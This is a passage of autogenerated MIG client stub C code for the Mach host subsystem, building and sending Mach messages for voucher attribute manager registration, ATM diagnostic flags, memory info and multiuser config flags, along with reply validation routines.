		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__host_register_mach_voucher_attr_manager_t__defined)
	check_result = __MIG_check__Reply__host_register_mach_voucher_attr_manager_t((__Reply__host_register_mach_voucher_attr_manager_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__host_register_mach_voucher_attr_manager_t__defined) */

	*new_key = Out0P->new_key;

	*new_attr_control = Out0P->new_attr_control.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__host_register_well_known_mach_voucher_attr_manager_t__defined)
#define __MIG_check__Reply__host_register_well_known_mach_voucher_attr_manager_t__defined

mig_internal kern_return_t __MIG_check__Reply__host_register_well_known_mach_voucher_attr_manager_t(__Reply__host_register_well_known_mach_voucher_attr_manager_t *Out0P)
{

	typedef __Reply__host_register_well_known_mach_voucher_attr_manager_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 324) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->new_attr_control.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->new_attr_control.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__host_register_well_known_mach_voucher_attr_manager_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine host_register_well_known_mach_voucher_attr_manager */
mig_external kern_return_t host_register_well_known_mach_voucher_attr_manager
(
	host_t host,
	mach_voucher_attr_manager_t attr_manager,
	mach_voucher_attr_value_handle_t default_value,
	mach_voucher_attr_key_t key,
	ipc_voucher_attr_control_t *new_attr_control
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t attr_manager;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_voucher_attr_value_handle_t default_value;
		mach_voucher_attr_key_t key;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_attr_control;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_attr_control;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__host_register_well_known_mach_voucher_attr_manager_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__host_register_well_known_mach_voucher_attr_manager_t__defined */

	__DeclareSendRpc(224, "host_register_well_known_mach_voucher_attr_manager")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t attr_managerTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->attr_manager = attr_managerTemplate;
	InP->attr_manager.name = attr_manager;
#else	/* UseStaticTemplates */
	InP->attr_manager.name = attr_manager;
	InP->attr_manager.disposition = 19;
	InP->attr_manager.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->default_value = default_value;

	InP->key = key;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 224;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(224, "host_register_well_known_mach_voucher_attr_manager")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(224, "host_register_well_known_mach_voucher_attr_manager")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__host_register_well_known_mach_voucher_attr_manager_t__defined)
	check_result = __MIG_check__Reply__host_register_well_known_mach_voucher_attr_manager_t((__Reply__host_register_well_known_mach_voucher_attr_manager_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__host_register_well_known_mach_voucher_attr_manager_t__defined) */

	*new_attr_control = Out0P->new_attr_control.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__host_set_atm_diagnostic_flag_t__defined)
#define __MIG_check__Reply__host_set_atm_diagnostic_flag_t__defined

mig_internal kern_return_t __MIG_check__Reply__host_set_atm_diagnostic_flag_t(__Reply__host_set_atm_diagnostic_flag_t *Out0P)
{

	typedef __Reply__host_set_atm_diagnostic_flag_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 325) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__host_set_atm_diagnostic_flag_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine host_set_atm_diagnostic_flag */
mig_external kern_return_t host_set_atm_diagnostic_flag
(
	host_t host,
	uint32_t diagnostic_flag
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		uint32_t diagnostic_flag;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__host_set_atm_diagnostic_flag_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__host_set_atm_diagnostic_flag_t__defined */

	__DeclareSendRpc(225, "host_set_atm_diagnostic_flag")

	InP->NDR = NDR_record;

	InP->diagnostic_flag = diagnostic_flag;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 225;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(225, "host_set_atm_diagnostic_flag")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(225, "host_set_atm_diagnostic_flag")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__host_set_atm_diagnostic_flag_t__defined)
	check_result = __MIG_check__Reply__host_set_atm_diagnostic_flag_t((__Reply__host_set_atm_diagnostic_flag_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__host_set_atm_diagnostic_flag_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__host_get_atm_diagnostic_flag_t__defined)
#define __MIG_check__Reply__host_get_atm_diagnostic_flag_t__defined

mig_internal kern_return_t __MIG_check__Reply__host_get_atm_diagnostic_flag_t(__Reply__host_get_atm_diagnostic_flag_t *Out0P)
{

	typedef __Reply__host_get_atm_diagnostic_flag_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 326) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__host_get_atm_diagnostic_flag_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine host_get_atm_diagnostic_flag */
mig_external kern_return_t host_get_atm_diagnostic_flag
(
	host_t host,
	uint32_t *diagnostic_flag
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint32_t diagnostic_flag;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint32_t diagnostic_flag;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__host_get_atm_diagnostic_flag_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__host_get_atm_diagnostic_flag_t__defined */

	__DeclareSendRpc(226, "host_get_atm_diagnostic_flag")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 226;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(226, "host_get_atm_diagnostic_flag")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(226, "host_get_atm_diagnostic_flag")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__host_get_atm_diagnostic_flag_t__defined)
	check_result = __MIG_check__Reply__host_get_atm_diagnostic_flag_t((__Reply__host_get_atm_diagnostic_flag_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__host_get_atm_diagnostic_flag_t__defined) */

	*diagnostic_flag = Out0P->diagnostic_flag;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__mach_memory_info_t__defined)
#define __MIG_check__Reply__mach_memory_info_t__defined

mig_internal kern_return_t __MIG_check__Reply__mach_memory_info_t(__Reply__mach_memory_info_t *Out0P)
{

	typedef __Reply__mach_memory_info_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 327) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 3 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->names.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->info.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->memory_info.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if __MigTypeCheck
	if (Out0P->names.size / 80 != Out0P->namesCnt)
		return MIG_TYPE_ERROR;
	if (Out0P->info.size / 64 != Out0P->infoCnt)
		return MIG_TYPE_ERROR;
	if (Out0P->memory_info.size / 176 != Out0P->memory_infoCnt)
		return MIG_TYPE_ERROR;
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__mach_memory_info_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine mach_memory_info */
mig_external kern_return_t mach_memory_info
(
	host_priv_t host,
	mach_zone_name_array_t *names,
	mach_msg_type_number_t *namesCnt,
	mach_zone_info_array_t *info,
	mach_msg_type_number_t *infoCnt,
	mach_memory_info_array_t *memory_info,
	mach_msg_type_number_t *memory_infoCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t names;
		mach_msg_ool_descriptor_t info;
		mach_msg_ool_descriptor_t memory_info;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t namesCnt;
		mach_msg_type_number_t infoCnt;
		mach_msg_type_number_t memory_infoCnt;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t names;
		mach_msg_ool_descriptor_t info;
		mach_msg_ool_descriptor_t memory_info;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t namesCnt;
		mach_msg_type_number_t infoCnt;
		mach_msg_type_number_t memory_infoCnt;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__mach_memory_info_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__mach_memory_info_t__defined */

	__DeclareSendRpc(227, "mach_memory_info")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host;
	InP->Head.msgh_id = 227;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(227, "mach_memory_info")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(227, "mach_memory_info")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__mach_memory_info_t__defined)
	check_result = __MIG_check__Reply__mach_memory_info_t((__Reply__mach_memory_info_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__mach_memory_info_t__defined) */

	*names = (mach_zone_name_array_t)(Out0P->names.address);
	*namesCnt = Out0P->namesCnt;

	*info = (mach_zone_info_array_t)(Out0P->info.address);
	*infoCnt = Out0P->infoCnt;

	*memory_info = (mach_memory_info_array_t)(Out0P->memory_info.address);
	*memory_infoCnt = Out0P->memory_infoCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__host_set_multiuser_config_flags_t__defined)
#define __MIG_check__Reply__host_set_multiuser_config_flags_t__defined

mig_internal kern_return_t __MIG_check__Reply__host_set_multiuser_config_flags_t(__Reply__host_set_multiuser_config_flags_t *Out0P)
{

	typedef __Reply__host_set_multiuser_config_flags_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 328) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__host_set_multiuser_config_flags_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine host_set_multiuser_config_flags */
mig_external kern_return_t host_set_multiuser_config_flags
(
	host_priv_t host_priv,
	uint32_t multiuser_flags
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		uint32_t multiuser_flags;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__host_set_multiuser_config_flags_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__host_set_multiuser_config_flags_t__defined */

	__DeclareSendRpc(228, "host_set_multiuser_config_flags")

	InP->NDR = NDR_record;

	InP->multiuser_flags = multiuser_flags;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = host_priv;
	InP->Head.msgh_id = 228;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(228, "host_set_multiuser_config_flags")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(228, "host_set_multiuser_config_flags")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__host_set_multiuser_config_flags_t__defined)
	check_result = __MIG_check__Reply__host_set_multiuser_config_flags_t((__Reply__host_set_multiuser_config_flags_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__host_set_multiuser_config_flags_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__mach_host_subsystem__
#if !defined(__MIG_check__Reply__host_get_multiuser_config_flags_t__defined)
#define __MIG_check__Reply__host_get_multiuser_config_flags_t__defined

mig_internal kern_return_t __MIG_check__Reply__host_get_multiuser_config_flags_t(__Reply__host_get_multiuser_config_flags_t *Out0P)
{

	typedef __Reply__host_get_multiuser_config_flags_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 329) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__host_get_multiuser_config_flags_t__defined) */
#endif /* __MIG_check__Reply__mach_host_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine host_get_multiuser_config_flags */
mig_external kern_return_t host_get_multiuser_config_flags
(
	host_t host,
	uint32_t *multiuser_flags
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint32_t multiuser_flags;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
